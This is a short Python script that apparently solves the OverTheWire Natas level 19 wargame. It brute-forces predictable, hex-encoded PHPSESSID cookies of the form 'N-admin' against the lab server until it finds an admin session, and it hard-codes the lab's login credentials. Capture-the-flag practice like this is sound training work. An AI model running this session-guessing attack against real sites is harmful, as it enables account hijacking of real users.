import requests
from requests.auth import HTTPBasicAuth
import binascii

url = "http://natas19.natas.labs.overthewire.org/"
username = "natas19"
password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
debug = 1

session = requests.Session()

for i in range(0,640):
	s = str(i) + "-admin"
	s = binascii.hexlify(s.encode('utf-8'))
	# print(s)
	cookies = {
		"PHPSESSID" : s.decode('utf-8')
	}
	if debug and i%10 == 0:
		print(f"Current PHPSESSID: {i}")
	req = session.post(url, auth=HTTPBasicAuth(username, password), cookies = cookies)
	if 'regular' not in req.text:
		print(f"Found Admin : Session ID is {i}")
		print(req.text)
		break